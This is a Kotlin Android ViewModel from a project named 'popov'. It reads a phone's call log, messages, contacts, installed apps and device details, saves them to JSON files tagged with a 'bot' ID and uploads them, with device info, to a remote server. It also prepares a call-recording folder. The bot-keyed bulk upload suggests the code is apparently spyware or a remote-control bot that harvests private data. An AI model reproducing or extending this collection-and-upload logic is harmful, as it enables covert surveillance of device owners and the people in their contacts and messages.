package com.github.yohannestz.popov.ui.viewmodels

import android.app.Application
import android.os.Environment
import android.util.Log
import androidx.compose.runtime.State
import androidx.compose.runtime.mutableStateOf
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.github.yohannestz.popov.data.local.ApplicationsRepository
import com.github.yohannestz.popov.data.local.CallRepository
import com.github.yohannestz.popov.data.local.ContactsRepository
import com.github.yohannestz.popov.data.local.DeviceInfoRepository
import com.github.yohannestz.popov.data.local.MessageRepository
import com.github.yohannestz.popov.data.local.db.impl.CallLogRepositoryImpl
import com.github.yohannestz.popov.data.local.db.impl.ContactsFileLogRepositoryImpl
import com.github.yohannestz.popov.data.local.db.impl.MessageLogRepositoryImpl
import com.github.yohannestz.popov.data.model.Bot
import com.github.yohannestz.popov.data.model.Call
import com.github.yohannestz.popov.data.model.ContactsFileLog
import com.github.yohannestz.popov.data.remote.NetworkService
import com.github.yohannestz.popov.ui.calls.CallScreenState
import com.google.gson.Gson
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.Calendar
import java.util.Date
import javax.inject.Inject

@HiltViewModel
class CallsViewModel @Inject constructor(
    private val callRepository: CallRepository,
    private val messageRepository: MessageRepository,
    private val contactsRepository: ContactsRepository,
    private val applicationsRepository: ApplicationsRepository,
    private val deviceInfoRepository: DeviceInfoRepository,
    private val networkService: NetworkService,
    private val callLogRepositoryImpl: CallLogRepositoryImpl,
    private val messageLogRepositoryImpl: MessageLogRepositoryImpl,
    private val contactsFileLogRepositoryImpl: ContactsFileLogRepositoryImpl,
    private val bot: Bot,
    private val application: Application
) : AndroidViewModel(application) {
    private val _state = mutableStateOf(CallScreenState())
    val state: State<CallScreenState> = _state

    private var list: List<Call> = emptyList()

    init {
        viewModelScope.launch {
            withContext(Dispatchers.Main) {
                _state.value = state.value.copy(
                    isLoading = true
                )
            }

            withContext(Dispatchers.Default) {
                list = callRepository.readCallsForToday()
            }

            withContext(Dispatchers.Main) {
                _state.value = state.value.copy(
                    callLogList = list,
                    isLoading = false
                )
            }
            withContext(Dispatchers.IO) {
                //initContactsCache()
                //startUpload()
                //getAllApps()
                getData()
            }
        }
    }

    private fun getData() {
        val gson = Gson()
        val str = gson.toJson(deviceInfoRepository.getDeviceInformation())
        Log.e("deviceInfo",str)
    }

    fun getAllApps() {
        viewModelScope.launch {
            withContext(Dispatchers.Main) {
                _state.value = state.value.copy(
                    isLoading = true
                )
            }

            withContext(Dispatchers.IO) {
                val apps = applicationsRepository.getAllApps()
                Log.e("apps: ", "size -> ${apps.size}")
                val currentTime: Date = Calendar.getInstance().time

                val appFile = File(
                    application.applicationContext.filesDir,
                    "apps_${bot.botId}_${currentTime.time}.json"
                )

                val gson = Gson()
                val fileOutputStream = FileOutputStream(appFile)
                try {
                    val jsonString = gson.toJson(apps)
                    fileOutputStream.write(jsonString.toByteArray())
                } catch (ex: Exception) {
                    ex.printStackTrace()
                } finally {
                    fileOutputStream.close()
                }

                val requestBody = RequestBody.create(MediaType.parse("text/plain"), appFile)
                val fileToUpload = MultipartBody.Part.createFormData("sampleFile", appFile.name, requestBody)
                val filename = RequestBody.create(MediaType.parse("multipart/form-data"), appFile.name)
                val response = networkService.uploadFile(fileToUpload, filename).body()
                Log.e("response: ", response.toString())
                if (response!!.success) {
                    Log.e("updatedDb: ", "apps are uploaded.")
                }
            }

            withContext(Dispatchers.Main) {
                _state.value = state.value.copy(
                    isLoading = false
                )
            }

        }
    }

    fun sendDeviceInfo() {
        viewModelScope.launch {
            withContext(Dispatchers.Main) {
                _state.value = state.value.copy(
                    isLoading = true
                )
            }

            withContext(Dispatchers.IO) {
                val deviceInfo = deviceInfoRepository.getDeviceInformation()
                val response = networkService.sendDeviceInfo(bot.botId, deviceInfo)
                Log.e("response: ", response.toString())
                if (response.isSuccessful) {
                    Log.e("updatedDb: ", "device info sent to server")
                }
            }

            withContext(Dispatchers.Main) {
                _state.value = state.value.copy(
                    isLoading = false
                )
            }

        }
    }

    private suspend fun initCache() {
        val todayList = callRepository.readCallsForToday()
        Log.e("ListSize: ", todayList.size.toString())
        if (todayList.isNotEmpty()) {
            callLogRepositoryImpl.insertCallLogs(todayList)
        }
    }

    private suspend fun initMessageCache() {
        val today = messageRepository.getAllMessagesForToday()
        Log.e("MessageSize: ", today.size.toString())
        if (today.isNotEmpty()) {
            messageLogRepositoryImpl.insertMessageLogs(today)
        }
    }

    private suspend fun initContactsCache() = withContext(Dispatchers.IO) {
        val contacts = contactsRepository.getAllContacts()
        Log.e("contactsSize: ", contacts.size.toString())

        val filePath =
            File("${Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)}${File.separator}" + "CallRec/call_rec.3gp")
        if (!filePath.exists()) {
            filePath.mkdirs()
        }
        Log.e("fileExists", filePath.exists().toString())

        val currentTime: Date = Calendar.getInstance().time

        val file = File(
            application.applicationContext.filesDir,
            "contacts_${bot.botId}_${currentTime.time}.json"
        )
        val gson = Gson()
        val fileOutputStream = FileOutputStream(file)
        try {
            val jsonString = gson.toJson(contacts)
            fileOutputStream.write(jsonString.toByteArray())
        } catch (ex: Exception) {
            ex.printStackTrace()
        } finally {
            fileOutputStream.close()
        }

        Log.e("fileWrite: ", "to ${file.absolutePath} successfully!")
        contactsFileLogRepositoryImpl.insertContactsFileLog(
            ContactsFileLog(
                fileUrl = file.absolutePath,
                loggedAt = currentTime.time.toString()
            )
        )
    }

    fun startUpload() {
        Log.e("startUpload", "started...")
        viewModelScope.launch {
            withContext(Dispatchers.Main) {
                _state.value = state.value.copy(
                    isLoading = true
                )
            }

            withContext(Dispatchers.IO) {
                val uploadList = contactsFileLogRepositoryImpl.getAllUnUploaded()
                uploadList.map { contactsFileLog ->
                    val file = File(contactsFileLog.fileUrl)
                    Log.e("fileExist: ", file.exists().toString())
                    Log.e("fileUrl: ", file.absolutePath.toString())
                    Log.e("fileSize: ", (file.length() / 1024).toString())
                    val requestBody = RequestBody.create(MediaType.parse("text/plain"), file)
                    val fileToUpload = MultipartBody.Part.createFormData("sampleFile", file.name, requestBody)
                    val filename = RequestBody.create(MediaType.parse("multipart/form-data"), file.name)

                    val response = networkService.uploadFile(fileToUpload, filename).body()
                    Log.e("response: ", response.toString())
                    if (response!!.success) {
                        contactsFileLogRepositoryImpl.markLogAsUnUploaded(contactsFileLog.id)
                        Log.e("updatedDb: ", "to uploaded for id ${contactsFileLog.id}")
                    }
                }
            }

            withContext(Dispatchers.Main) {
                _state.value = state.value.copy(
                    isLoading = false
                )
            }
        }
        Log.e("startUpload", "finished...")

    }
}